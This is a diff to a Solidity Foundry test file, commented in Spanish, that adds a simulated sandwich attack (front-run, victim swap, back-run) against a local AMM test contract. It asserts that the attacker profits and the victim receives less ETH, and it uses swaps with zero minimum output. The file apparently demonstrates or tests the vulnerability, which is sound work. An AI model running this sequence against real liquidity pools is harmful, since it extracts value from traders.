@@ -214,8 +214,136 @@ contract AMMTest is Test {
     }
 
     // =========================================================================
+    // TEST: Sandwich Attack
+    // =========================================================================
+
+    function test_SandwichAttack() public {
+        console.log("\n========== SANDWICH ATTACK ==========\n");
+
+        // Actores
+        address victim = makeAddr("victim");
+        address attacker = makeAddr("attacker");
+
+        // Preparar victima y atacante con fondos
+        _setupActor(victim);
+        _setupActor(attacker);
+
+        // Montos de swap
+        uint256 victimUsdToSwap = 6000 * 1e18;    // Victima quiere comprar ETH con 6000 USD
+        uint256 attackerUsdToSwap = 3000 * 1e18; // Atacante usa 3000 USD para front-run
+
+        // Guardar balance inicial del atacante
+        uint256 attackerUsdInitial = usd.balanceOf(attacker);
+
+        console.log("=== ESTADO INICIAL ===");
+        _logPrice();
+        _logReserves("Inicial");
+
+        // Simular lo que la victima hubiera recibido SIN sandwich
+        uint256 victimEthWithoutAttack = _simulateSwapUsdToEth(victimUsdToSwap);
+        console.log("SIN ATAQUE - Victima recibiria: %s mETH\n", victimEthWithoutAttack / 1e15);
+
+        // =====================================================================
+        // PASO 1: FRONT-RUN - Atacante compra ETH antes que la victima
+        // =====================================================================
+        console.log("=== PASO 1: FRONT-RUN ===");
+        console.log("Atacante compra ETH con %s USD", attackerUsdToSwap / 1e18);
+
+        vm.prank(attacker);
+        uint256 attackerEthReceived = amm.tokenToEthSwap(attackerUsdToSwap, 0);
+
+        console.log("ETH recibido por atacante: %s mETH", attackerEthReceived / 1e15);
+        _logPrice();
+
+        // =====================================================================
+        // PASO 2: TX VICTIMA - Se ejecuta a peor precio
+        // =====================================================================
+        console.log("\n=== PASO 2: TX VICTIMA ===");
+        console.log("Victima compra ETH con %s USD (a peor precio!)", victimUsdToSwap / 1e18);
+
+        vm.prank(victim);
+        uint256 victimEthReceived = amm.tokenToEthSwap(victimUsdToSwap, 0);
+
+        console.log("ETH recibido por victima: %s mETH", victimEthReceived / 1e15);
+        _logPrice();
+
+        // =====================================================================
+        // PASO 3: BACK-RUN - Atacante vende el ETH que compro
+        // =====================================================================
+        console.log("\n=== PASO 3: BACK-RUN ===");
+        console.log("Atacante vende %s mETH", attackerEthReceived / 1e15);
+
+        vm.prank(attacker);
+        uint256 attackerUsdReceived = amm.ethToTokenSwap{value: attackerEthReceived}(0);
+
+        console.log("USD recibido por atacante: %s", attackerUsdReceived / 1e18);
+        _logPrice();
+
+        // =====================================================================
+        // RESULTADO FINAL
+        // =====================================================================
+        _logSandwichResult(
+            attackerUsdInitial,
+            usd.balanceOf(attacker),
+            victimEthWithoutAttack,
+            victimEthReceived
+        );
+
+        // Verificaciones
+        assertGt(usd.balanceOf(attacker), attackerUsdInitial, "Atacante deberia tener ganancia");
+        assertLt(victimEthReceived, victimEthWithoutAttack, "Victima deberia recibir menos ETH");
+    }
+
+    // =========================================================================
     // HELPERS
     // =========================================================================
+
+    function _setupActor(address actor) internal {
+        vm.deal(actor, 100 ether);
+        usd.mint(actor, 100_000 * 1e18);
+        vm.prank(actor);
+        usd.approve(address(amm), type(uint256).max);
+    }
+
+    function _logPrice() internal view {
+        (uint256 ethRes, uint256 usdRes) = amm.getReserves();
+        console.log("Precio: %s USD/ETH", (usdRes * 1e18 / ethRes) / 1e18);
+    }
+
+    function _logSandwichResult(
+        uint256 attackerUsdInitial,
+        uint256 attackerUsdFinal,
+        uint256 victimEthExpected,
+        uint256 victimEthReceived
+    ) internal view {
+        console.log("\n========== RESULTADO ==========\n");
+
+        console.log("=== ATACANTE ===");
+        console.log("USD inicial: %s", attackerUsdInitial / 1e18);
+        console.log("USD final: %s", attackerUsdFinal / 1e18);
+        uint256 profit = attackerUsdFinal - attackerUsdInitial;
+        console.log("GANANCIA: %s USD (en base units)", profit);
+        console.log("GANANCIA: %s USD", profit / 1e18);
+
+        console.log("\n=== VICTIMA ===");
+        console.log("ETH que hubiera recibido: %s mETH", victimEthExpected / 1e15);
+        console.log("ETH que recibio: %s mETH", victimEthReceived / 1e15);
+        uint256 loss = victimEthExpected - victimEthReceived;
+        console.log("PERDIDA: %s mETH", loss / 1e15);
+        console.log("PERDIDA: %s (en base units)", loss);
+
+        _logReserves("Final");
+    }
+
+    // =========================================================================
+    // HELPERS
+    // =========================================================================
+
+    /// @notice Simula un swap USD -> ETH sin ejecutarlo (para comparar)
+    function _simulateSwapUsdToEth(uint256 usdAmount) internal view returns (uint256) {
+        (uint256 ethReserve, uint256 usdReserve) = amm.getReserves();
+        return (usdAmount * ethReserve) / (usdReserve + usdAmount);
+    }
 
     function _logReserves(string memory label) internal view {
         (uint256 ethRes, uint256 usdRes) = amm.getReserves();
